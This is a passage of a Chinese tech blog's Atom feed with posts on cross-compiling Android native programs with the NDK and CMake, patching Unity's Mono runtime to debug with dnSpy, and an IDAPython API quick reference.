&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;下载人物模型，动作，镜头动作并添加&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;修改人物动作，镜头动作适配模型大小&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;下载场景模型并添加&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;修改人物/镜头的动作/位置适配场景&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;添加mme，完善细节&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;上面并没有明显顺序关系，想按什么顺序来都行。&lt;/p&gt;</summary>
    
    
    
    
    <category term="mmd" scheme="https://ihopenot.github.io/tags/mmd/"/>
    
  </entry>
  
  <entry>
    <title>交叉编译android native程序</title>
    <link href="https://ihopenot.github.io/2022/04/22/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91android-native%E7%A8%8B%E5%BA%8F/"/>
    <id>https://ihopenot.github.io/2022/04/22/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91android-native%E7%A8%8B%E5%BA%8F/</id>
    <published>2022-04-22T13:24:28.000Z</published>
    <updated>2023-08-24T14:59:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>前几天比赛用到要编译c代码到android上面跑，当时用了最直接gnu套件交叉编译过去，后来感觉有必要学习一下android ndk的用法，这篇文章就总结一下。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="gnu套件"><a href="#gnu套件" class="headerlink" title="gnu套件"></a>gnu套件</h3><p>最土制的方法，直接装个编译器，这些应该都可以，ubuntu直接apt装上之后编译就行了。</p><img src="/2022/04/22/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91android-native%E7%A8%8B%E5%BA%8F/image-20220422213335858.png" class="" title="image-20220422213335858"><h3 id="ndk-cmake"><a href="#ndk-cmake" class="headerlink" title="ndk + cmake"></a>ndk + cmake</h3><p>先到官网下个对应版本的ndk</p><p><a href="https://developer.android.com/ndk/downloads?hl=zh-cn">https://developer.android.com/ndk/downloads?hl=zh-cn</a></p><p>cmake 3.21之后好像原生支持了使用ndk交叉编译，只要在cmake开始指定CMAKE_SYSTEM_NAME，再把ndk路径丢给它就行了。</p><span id="more"></span><p>cmake代码：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.21</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set NDK path</span></span><br><span class="line"><span class="keyword">set</span>(ANDROID_NDK <span class="string">&quot;/path/to/your/android-ndk&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定CMAKE_SYSTEM_NAME要放在project前面，不然不会生效</span></span><br><span class="line"><span class="comment"># set CMake Cross-Compile Target</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_SYSTEM_NAME Android)</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>(CMAKE_ANDROID_NDK <span class="variable">$&#123;ANDROID_NDK&#125;</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_ANDROID_API <span class="number">24</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_ANDROID_ARCH_ABI armeabi-v7a)</span><br><span class="line"><span class="comment"># set(CMAKE_ANDROID_STL_TYPE c++_static)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: for clangd</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_EXPORT_COMPILE_COMMANDS <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span>(main)</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>(CMAKE_BUILD_TYPE Release)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span>(<span class="variable">$&#123;PROJECT_NAME&#125;</span> <span class="keyword">test</span>.cpp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#123;CMAKE_STRIP&#125;是ndk toolchain下的strip工具</span></span><br><span class="line"><span class="comment"># 各种工具都放在$&#123;CMAKE_ANDROID_NDK_TOOLCHAIN_UNIFIED&#125;/bin里面</span></span><br><span class="line"><span class="comment"># strip symbols</span></span><br><span class="line"><span class="keyword">add_custom_command</span>(<span class="keyword">TARGET</span> <span class="variable">$&#123;PROJECT_NAME&#125;</span> POST_BUILD</span><br><span class="line">    <span class="keyword">COMMAND</span> <span class="variable">$&#123;CMAKE_STRIP&#125;</span> -s <span class="variable">$&#123;CMAKE_CURRENT_BINARY_DIR&#125;</span>/<span class="variable">$&#123;PROJECT_NAME&#125;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>老版本cmake也可以指定-D参数传过去</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmake -DCMAKE_TOOLCHAIN_FILE=<span class="variable">$ANDROID_NDK</span>/build/cmake/android.toolchain.cmake \</span><br><span class="line">-DANDROID_ABI=<span class="string">&quot;armeabi-v7a&quot;</span> \</span><br><span class="line">-DANDROID_NDK=<span class="variable">$ANDROID_NDK</span> \</span><br><span class="line">-DANDROID_PLATFORM=<span class="string">&quot;android-22&quot;</span> \</span><br></pre></td></tr></table></figure><p>具体cmake的参数和ndk的参数参见</p><p>cmake参数：<a href="https://cmake.org/cmake/help/latest/manual/cmake-toolchains.7.html#cross-compiling-for-android">https://cmake.org/cmake/help/latest/manual/cmake-toolchains.7.html#cross-compiling-for-android</a></p><p>工具链参数：<a href="https://developer.android.com/ndk/guides/cmake?hl=zh-cn#variables">https://developer.android.com/ndk/guides/cmake?hl=zh-cn#variables</a></p><h3 id="ndk-build"><a href="#ndk-build" class="headerlink" title="ndk build"></a>ndk build</h3><p>使用ndk自带的ndk build脚本构建，需要写一个Android.mk，是个类似cmake的东西，</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := <span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span></span><br><span class="line">LOCAL_MODULE := cpufeatures</span><br><span class="line">LOCAL_SRC_FILES := cpu-features.c</span><br><span class="line">LOCAL_CFLAGS := -Wall -Wextra -Werror</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := <span class="variable">$(LOCAL_PATH)</span></span><br><span class="line">LOCAL_EXPORT_LDLIBS := -ldl</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(BUILD_STATIC_LIBRARY)</span></span><br></pre></td></tr></table></figure><p>样例在ndk&#x2F;sources&#x2F;下面有，具体参数参见下面的链接。</p><p><a href="https://developer.android.com/ndk/guides/android_mk?hl=zh-cn">https://developer.android.com/ndk/guides/android_mk?hl=zh-cn</a></p><h2 id="别的一些问题"><a href="#别的一些问题" class="headerlink" title="别的一些问题"></a>别的一些问题</h2><p>之前编译的时候老是找不到process_vm_readv和writev，后来发现是android编译api版本太老了，有的函数可能不支持。</p><p>还有编译出来的东西直接跑会报个<code>unsupported flags DT_FLAGS_1=0x8000001</code>，好像是<code>.dynamic</code>段的什么东西炸了，但是好像不影响运行。github上有个脚本好像可以修复这个东西，叫termux-elf-cleaner</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Background&quot;&gt;&lt;a href=&quot;#Background&quot; class=&quot;headerlink&quot; title=&quot;Background&quot;&gt;&lt;/a&gt;Background&lt;/h2&gt;&lt;p&gt;前几天比赛用到要编译c代码到android上面跑，当时用了最直接gnu套件交叉编译过去，后来感觉有必要学习一下android ndk的用法，这篇文章就总结一下。&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;h3 id=&quot;gnu套件&quot;&gt;&lt;a href=&quot;#gnu套件&quot; class=&quot;headerlink&quot; title=&quot;gnu套件&quot;&gt;&lt;/a&gt;gnu套件&lt;/h3&gt;&lt;p&gt;最土制的方法，直接装个编译器，这些应该都可以，ubuntu直接apt装上之后编译就行了。&lt;/p&gt;
&lt;img src=&quot;/2022/04/22/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91android-native%E7%A8%8B%E5%BA%8F/image-20220422213335858.png&quot; class=&quot;&quot; title=&quot;image-20220422213335858&quot;&gt;

&lt;h3 id=&quot;ndk-cmake&quot;&gt;&lt;a href=&quot;#ndk-cmake&quot; class=&quot;headerlink&quot; title=&quot;ndk + cmake&quot;&gt;&lt;/a&gt;ndk + cmake&lt;/h3&gt;&lt;p&gt;先到官网下个对应版本的ndk&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://developer.android.com/ndk/downloads?hl=zh-cn&quot;&gt;https://developer.android.com/ndk/downloads?hl=zh-cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;cmake 3.21之后好像原生支持了使用ndk交叉编译，只要在cmake开始指定CMAKE_SYSTEM_NAME，再把ndk路径丢给它就行了。&lt;/p&gt;</summary>
    
    
    
    
    <category term="开发" scheme="https://ihopenot.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>dnSpy调试Unity程序</title>
    <link href="https://ihopenot.github.io/2022/03/31/dnSpy%E8%B0%83%E8%AF%95Unity%E7%A8%8B%E5%BA%8F/"/>
    <id>https://ihopenot.github.io/2022/03/31/dnSpy%E8%B0%83%E8%AF%95Unity%E7%A8%8B%E5%BA%8F/</id>
    <published>2022-03-31T06:39:43.000Z</published>
    <updated>2023-08-24T14:54:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>想日一个东西，发现是个Unity写的程序，而且被混淆过，有点难看。</p><p>想去动调，发现Unity写的东西想调试Assembly-Csharp.dll不能直接用dnSpy起，没法动调，看了下github的仓库，发现仓库已经是Archived的了，很多东西都没了。网上找了下资料很多也语焉不详，这里记录一下怎么用dnSpy去调Unity。</p><h2 id="Patch-Mono"><a href="#Patch-Mono" class="headerlink" title="Patch Mono"></a>Patch Mono</h2><p>用dnSpy去调试Unity需要魔改Mono的代码，详细可以看<a href="https://github.com/dnSpy/dnSpy-Unity-mono%E8%BF%99%E4%B8%AA%E4%BB%93%E5%BA%93%E3%80%82">https://github.com/dnSpy/dnSpy-Unity-mono这个仓库。</a></p><ol><li><p>首先把mono官方仓库clone下来</p><p><code>git clone https://github.com/Unity-Technologies/mono</code></p></li><li><p>把dnSpy-Unity-mono也clone下来</p><p><code>git clone https://github.com/dnSpy/dnSpy-Unity-mono</code></p></li><li><p>编译umpatcher，这个在dnSpy-Unity-mono&#x2F;src&#x2F;umpathcer里，需要使用vs进行编译。（需要安装.Net框架）</p></li></ol><span id="more"></span><ol start="4"><li><p>找到你需要的Mono版本，一般可以从Unity程序的properties里面看到</p><img src="/2022/03/31/dnSpy%E8%B0%83%E8%AF%95Unity%E7%A8%8B%E5%BA%8F/image-20220331145246919.png" class="" title="image-20220331145246919"><p>比如这个就是2019.4.37-mbe</p></li><li><p>在mono官方仓库里找到对应tags的最新一个commit，把commitId记下来</p><img src="/2022/03/31/dnSpy%E8%B0%83%E8%AF%95Unity%E7%A8%8B%E5%BA%8F/image-20220331145527488.png" class="" title="image-20220331145527488"><p>这里2019.4.37-mbe对应的就是 <code>66f6777a1aa48e3f7455172146303ced039fc2d7</code></p><p>或者也可以按dnSpy-Unity-mono里面说的，到Unity官网下个对应的Setup.exe，解包出来mono.dll看时间戳去找对应commit。</p></li><li><p>在mono仓库里切换到对应的tag，这里就是2019.4.37f1 （不确定是否必需）</p></li><li><p>使用umpatcher进行patch</p><p><code>umpatcher 2019.4.37-mbe 66f6777a1aa48e3f7455172146303ced039fc2d7 &quot;\path\to\Unity-mono&quot; &quot;\path\to\dnSpy-Unity-mono&quot;</code></p><p>如果是MonoBleedingEdge一定要加上-mbe，程序会用这个判断patch模式。</p></li><li><p>在dnSpy-Unity-mono仓库中找到对应的vs项目文件，开始编译，这里就是<code>dnSpy-Unity-mono-v2019.x-V40.sln</code> （需要windowsSDK）</p></li><li><p>把编译好的dll丢到程序对应位置，使用dnSpy开始调试。</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Background&quot;&gt;&lt;a href=&quot;#Background&quot; class=&quot;headerlink&quot; title=&quot;Background&quot;&gt;&lt;/a&gt;Background&lt;/h2&gt;&lt;p&gt;想日一个东西，发现是个Unity写的程序，而且被混淆过，有点难看。&lt;/p&gt;
&lt;p&gt;想去动调，发现Unity写的东西想调试Assembly-Csharp.dll不能直接用dnSpy起，没法动调，看了下github的仓库，发现仓库已经是Archived的了，很多东西都没了。网上找了下资料很多也语焉不详，这里记录一下怎么用dnSpy去调Unity。&lt;/p&gt;
&lt;h2 id=&quot;Patch-Mono&quot;&gt;&lt;a href=&quot;#Patch-Mono&quot; class=&quot;headerlink&quot; title=&quot;Patch Mono&quot;&gt;&lt;/a&gt;Patch Mono&lt;/h2&gt;&lt;p&gt;用dnSpy去调试Unity需要魔改Mono的代码，详细可以看&lt;a href=&quot;https://github.com/dnSpy/dnSpy-Unity-mono%E8%BF%99%E4%B8%AA%E4%BB%93%E5%BA%93%E3%80%82&quot;&gt;https://github.com/dnSpy/dnSpy-Unity-mono这个仓库。&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;首先把mono官方仓库clone下来&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git clone https://github.com/Unity-Technologies/mono&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;把dnSpy-Unity-mono也clone下来&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git clone https://github.com/dnSpy/dnSpy-Unity-mono&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;编译umpatcher，这个在dnSpy-Unity-mono&amp;#x2F;src&amp;#x2F;umpathcer里，需要使用vs进行编译。（需要安装.Net框架）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    
    <category term="逆向" scheme="https://ihopenot.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Idapython常用命令</title>
    <link href="https://ihopenot.github.io/2021/06/16/Idapython%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://ihopenot.github.io/2021/06/16/Idapython%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2021-06-16T07:24:36.000Z</published>
    <updated>2023-08-24T14:46:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>idapython几乎所有api都有注解，在 path&#x2F;to&#x2F;your&#x2F;ida&#x2F;python&#x2F;2(3)&#x2F; 里面，这里只是做个快速索引。</p><span id="more"></span><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><h3 id="ida-bytes-bin-search"><a href="#ida-bytes-bin-search" class="headerlink" title="ida_bytes.bin_search"></a>ida_bytes.bin_search</h3><blockquote><p>​    bin_search(start_ea, end_ea, image, imask, step, flags) -&gt; ea_t<br>​    Search for a set of bytes in the program<br>​<br>​    @param start_ea: linear address, start of range to search<br>​    @param end_ea: linear address, end of range to search (exclusive)<br>​    @param image: the set of bytes to search for<br>​    @param imask: a bitfield representing the mask in ‘image’ (can be None)<br>​    @param step: either BIN_SEARCH_FORWARD, or BIN_SEARCH_BACKWARD<br>​    @param flags: combination of BIN_SEARCH_* flags<br>​    @return: the address of a match, or ida_idaapi.BADADDR if not found</p></blockquote><blockquote><p>BIN_SEARCH_CASE &#x3D; _ida_bytes.BIN_SEARCH_CASE<br>“””<br>case sensitive<br>“””</p><p>BIN_SEARCH_NOCASE &#x3D; _ida_bytes.BIN_SEARCH_NOCASE<br>“””<br>case insensitive<br>“””</p><p>BIN_SEARCH_NOBREAK &#x3D; _ida_bytes.BIN_SEARCH_NOBREAK<br>“””<br>don’t check for Ctrl-Break<br>“””</p><p>BIN_SEARCH_INITED &#x3D; _ida_bytes.BIN_SEARCH_INITED<br>“””<br>find_byte, find_byter: any initilized value<br>“””</p><p>BIN_SEARCH_NOSHOW &#x3D; _ida_bytes.BIN_SEARCH_NOSHOW<br>“””<br>don’t show search progress or update screen<br>“””</p><p>BIN_SEARCH_FORWARD &#x3D; _ida_bytes.BIN_SEARCH_FORWARD<br>“””<br>search forward for bytes<br>“””</p><p>BIN_SEARCH_BACKWARD &#x3D; _ida_bytes.BIN_SEARCH_BACKWARD<br>“””<br>search backward for bytes<br>“””</p></blockquote><h2 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h2><h3 id="idaapi-add-enum"><a href="#idaapi-add-enum" class="headerlink" title="idaapi.add_enum"></a>idaapi.add_enum</h3><blockquote><p>​    Add new enum type.if idx&#x3D;&#x3D; ‘BADADDR’ then add as the last idxif<br>​    name&#x3D;&#x3D;NULL then generate a unique name “enum_%d”<br>​<br>​    add_enum(idx, name, flag) -&gt; enum_t<br>​        @param idx (C++: size_t)<br>​        @param name (C++: const char *)<br>​        @param flag (C++: flags_t)</p></blockquote><blockquote><p>idx - serial number of the new enum. If another enum with the same serial number exists, then all enums with serial numbers &gt;&#x3D; the specified idx get their serial numbers incremented (in other words, the new enum is put in the middle of the list of enums).<br>If idx &gt;&#x3D; get_enum_qty() or idx &#x3D;&#x3D; idaapi.BADNODE then the new enum is created at the end of the list of enums.</p></blockquote><blockquote><p>name - name of the enum.</p></blockquote><blockquote><p>flag - flags for representation of numeric constants in the definition of enum.</p><p>不知道干啥的，好像没啥影响</p></blockquote><h3 id="idaapi-add-enum-member"><a href="#idaapi-add-enum-member" class="headerlink" title="idaapi.add_enum_member"></a>idaapi.add_enum_member</h3><blockquote><p>Add member to enum type.</p><p>add_enum_member(id, name, value, bmask&#x3D;(bmask_t(-1))) -&gt; int<br>    @param id (C++: enum_t)<br>    @param name (C++: const char *)<br>    @param value (C++: uval_t)<br>    @param bmask (C++: bmask_t)<br>    @return: 0 if ok, otherwise one of  Add enum member result codes</p></blockquote><blockquote><p>id - 可以使用idaapi.get_enum(name)获取</p></blockquote><blockquote><p>bmask - 一般使用 idaapi.DEFMASK</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="idaapi-del-func"><a href="#idaapi-del-func" class="headerlink" title="idaapi.del_func"></a>idaapi.del_func</h3><blockquote><p>Delete a function.</p><p>del_func(ea) -&gt; bool<br>    @param ea: any address in the function entry chunk (C++: ea_t)<br>    @return: success</p></blockquote><h3 id="idaapi-add-func"><a href="#idaapi-add-func" class="headerlink" title="idaapi.add_func"></a>idaapi.add_func</h3><blockquote><p>Add a new function. If the function end address is ‘BADADDR’ , then<br>IDA will try to determine the function bounds by calling<br>find_func_bounds(…, ‘FIND_FUNC_DEFINE’ ).</p><p>add_func(ea1, ea2&#x3D;BADADDR) -&gt; bool<br>    @param ea1: start address (C++: ea_t)<br>    @param ea2: end address (C++: ea_t)<br>    @return: success</p></blockquote><h3 id="idaapi-create-insn"><a href="#idaapi-create-insn" class="headerlink" title="idaapi.create_insn"></a>idaapi.create_insn</h3><blockquote><p>Create an instruction at the specified address. This function checks<br>if an instruction is present at the specified address and will try to<br>create one if there is none. It will fail if there is a data item or<br>other items hindering the creation of the new instruction. This<br>function will also fill the ‘out’ structure.</p><p>create_insn(ea, out&#x3D;None) -&gt; int<br>    @param ea: linear address (C++: ea_t)<br>    @param out: the resulting instruction (C++: insn_t  *)<br>    @return: the length of the instruction or 0</p></blockquote><h3 id="idaapi-del-items"><a href="#idaapi-del-items" class="headerlink" title="idaapi.del_items"></a>idaapi.del_items</h3><blockquote><p>Convert item (instruction&#x2F;data) to unexplored bytes. The whole item<br>(including the head and tail bytes) will be destroyed. It is allowed<br>to pass any address in the item to this function</p><p>del_items(ea, flags&#x3D;0, nbytes&#x3D;1, may_destroy&#x3D;None) -&gt; bool<br>    @param ea: any address within the first item to delete (C++: ea_t)<br>    @param flags: combination of  Unexplored byte conversion flags (C++:<br>                  int)<br>    @param nbytes: number of bytes in the range to be undefined (C++:<br>                   asize_t)<br>    @param may_destroy: optional routine invoked before deleting a head<br>                        item. If callback returns false then item has not<br>                        to be deleted and operation fails (C++:<br>                        may_destroy_cb_t  *)<br>    @return: true on sucessful operation, otherwise false</p></blockquote><h2 id="交叉引用"><a href="#交叉引用" class="headerlink" title="交叉引用"></a>交叉引用</h2><h3 id="idautils-CodeRefsTo"><a href="#idautils-CodeRefsTo" class="headerlink" title="idautils.CodeRefsTo"></a>idautils.CodeRefsTo</h3><h3 id="idautils-CodeRefsFrom"><a href="#idautils-CodeRefsFrom" class="headerlink" title="idautils.CodeRefsFrom"></a>idautils.CodeRefsFrom</h3><blockquote><p>Get a list of code references to(from) ‘ea’</p><p>@param ea:   Target address<br>@param flow: Follow normal code flow or not<br>@type  flow: Boolean (0&#x2F;1, False&#x2F;True)</p><p>@return: list of references (may be empty list)</p><p>Example::<br>    for ref in CodeRefsTo(get_screen_ea(), 1):<br>        print(ref)</p></blockquote><h3 id="idautils-DataRefsTo"><a href="#idautils-DataRefsTo" class="headerlink" title="idautils.DataRefsTo"></a>idautils.DataRefsTo</h3><h3 id="idautils-DataRefsFrom"><a href="#idautils-DataRefsFrom" class="headerlink" title="idautils.DataRefsFrom"></a>idautils.DataRefsFrom</h3><blockquote><p>Get a list of data references to(from) ‘ea’</p><p>@param ea:   Target address</p><p>@return: list of references (may be empty list)</p><p>Example::<br>    for ref in DataRefsTo(get_screen_ea()):<br>        print(ref)</p></blockquote><h3 id="idautils-XrefsTo"><a href="#idautils-XrefsTo" class="headerlink" title="idautils.XrefsTo"></a>idautils.XrefsTo</h3><h3 id="idautils-XrefsFrom"><a href="#idautils-XrefsFrom" class="headerlink" title="idautils.XrefsFrom"></a>idautils.XrefsFrom</h3><blockquote><p>Return all references to(from) address ‘ea’</p><p>@param ea: Reference address<br>@param flags: one of ida_xref.XREF_ALL (default), ida_xref.XREF_FAR, ida_xref.XREF_DATA</p><p>Example::<br>       for xref in XrefsTo(here(), 0):<br>           print(xref.type, XrefTypeName(xref.type), <br>                     ‘from’, hex(xref.frm), ‘to’, hex(xref.to))</p></blockquote><h3 id="idautils-XrefsTypeName"><a href="#idautils-XrefsTypeName" class="headerlink" title="idautils.XrefsTypeName"></a>idautils.XrefsTypeName</h3><blockquote><p>Convert cross-reference type codes to readable names</p><p>@param typecode: cross-reference type code</p></blockquote><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><h3 id="idaapi-print-insn-mnem"><a href="#idaapi-print-insn-mnem" class="headerlink" title="idaapi.print_insn_mnem"></a>idaapi.print_insn_mnem</h3><blockquote><p>Print instruction mnemonics.</p><p>print_insn_mnem(ea) -&gt; str<br>    @param ea: linear address of the instruction (C++: ea_t)<br>    @return: success</p></blockquote><p>ea位置如果在ida中是undefined的话会读不出来，它不会去decode而是直接读asm出来。</p><p>像这种<img src="/2021/06/16/Idapython%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/image-20210616202525303.png" alt="image-20210616202525303"></p><h3 id="idc-GetDisasm"><a href="#idc-GetDisasm" class="headerlink" title="idc.GetDisasm"></a>idc.GetDisasm</h3><blockquote><p>Get disassembly line</p><p>@param ea: linear address of instruction</p><p>@return: “” - could not decode instruction at the specified location</p><p>@note: this function may not return exactly the same mnemonics<br>       as you see on the screen.</p></blockquote><p>就是获取ea位置的asm，如果是undefined的话会读出来 db 57h 这种东西，并且会读出来 <strong>;</strong> 后面的注释内容</p><p>像这样<img src="/2021/06/16/Idapython%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/image-20210617153806003.png" alt="image-20210617153806003"></p><h3 id="idaapi-decode-insn"><a href="#idaapi-decode-insn" class="headerlink" title="idaapi.decode_insn"></a>idaapi.decode_insn</h3><blockquote><p>Analyze the specified address and fill ‘out’. This function does not<br>modify the database. It just tries to interpret the specified address<br>as an instruction and fills the ‘out’ structure.</p><p>decode_insn(out, ea) -&gt; int<br>    @param out: the resulting instruction (C++: insn_t  *)<br>    @param ea: linear address (C++: ea_t)<br>    @return: the length of the (possible) instruction or 0</p></blockquote><p>解析ea出的机器码，输出到 out 指向的 insn_t 中，实际使用时 out 参数传入idaapi.insn_t()返回的一个对象，之后再通过这个对象去获取对应位置指令信息</p><p>example：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ins = idaapi.insn_t()</span><br><span class="line">idaapi.decode_insn(ins, <span class="number">0x401000</span>) <span class="comment"># push r15</span></span><br><span class="line">ins.get_canon_mnem() <span class="comment"># return &#x27;push&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="idc-get-operand-type"><a href="#idc-get-operand-type" class="headerlink" title="idc.get_operand_type"></a>idc.get_operand_type</h3><blockquote><p>Get type of instruction operand</p><p>@param ea: linear address of instruction<br>@param n: number of operand:<br>    0 - the first operand<br>    1 - the second operand</p><p>@return: any of o_* constants or -1 on error</p></blockquote><p>o_*定义再 idc 中</p><blockquote><p>o_void     &#x3D; ida_ua.o_void      # No Operand                           ———-<br>o_reg      &#x3D; ida_ua.o_reg       # General Register (al,ax,es,ds…)    reg<br>o_mem      &#x3D; ida_ua.o_mem       # Direct Memory Reference  (DATA)      addr<br>o_phrase   &#x3D; ida_ua.o_phrase    # Memory Ref [Base Reg + Index Reg]    phrase<br>o_displ    &#x3D; ida_ua.o_displ     # Memory Reg [Base Reg + Index Reg + Displacement] phrase+addr<br>o_imm      &#x3D; ida_ua.o_imm       # Immediate Value                      value<br>o_far      &#x3D; ida_ua.o_far       # Immediate Far Address  (CODE)        addr<br>o_near     &#x3D; ida_ua.o_near      # Immediate Near Address (CODE)        addr<br>o_idpspec0 &#x3D; ida_ua.o_idpspec0  # Processor specific type<br>o_idpspec1 &#x3D; ida_ua.o_idpspec1  # Processor specific type<br>o_idpspec2 &#x3D; ida_ua.o_idpspec2  # Processor specific type<br>o_idpspec3 &#x3D; ida_ua.o_idpspec3  # Processor specific type<br>o_idpspec4 &#x3D; ida_ua.o_idpspec4  # Processor specific type<br>o_idpspec5 &#x3D; ida_ua.o_idpspec5  # Processor specific type<br>                                                            # There can be more processor specific types</p><p># x86</p><p>o_trreg  &#x3D;       ida_ua.o_idpspec0      # trace register<br>o_dbreg  &#x3D;       ida_ua.o_idpspec1      # debug register<br>o_crreg  &#x3D;       ida_ua.o_idpspec2      # control register<br>o_fpreg  &#x3D;       ida_ua.o_idpspec3      # floating point register<br>o_mmxreg  &#x3D;      ida_ua.o_idpspec4      # mmx register<br>o_xmmreg  &#x3D;      ida_ua.o_idpspec5      # xmm register</p><p># arm</p><p>o_reglist  &#x3D;     ida_ua.o_idpspec1      # Register list (for LDM&#x2F;STM)<br>o_creglist  &#x3D;    ida_ua.o_idpspec2      # Coprocessor register list (for CDP)<br>o_creg  &#x3D;        ida_ua.o_idpspec3      # Coprocessor register (for LDC&#x2F;STC)<br>o_fpreglist  &#x3D;   ida_ua.o_idpspec4      # Floating point register list<br>o_text  &#x3D;        ida_ua.o_idpspec5      # Arbitrary text stored in the operand<br>o_cond  &#x3D;        (ida_ua.o_idpspec5+1)  # ARM condition as an operand</p><p># ppc</p><p>o_spr  &#x3D;         ida_ua.o_idpspec0      # Special purpose register<br>o_twofpr  &#x3D;      ida_ua.o_idpspec1     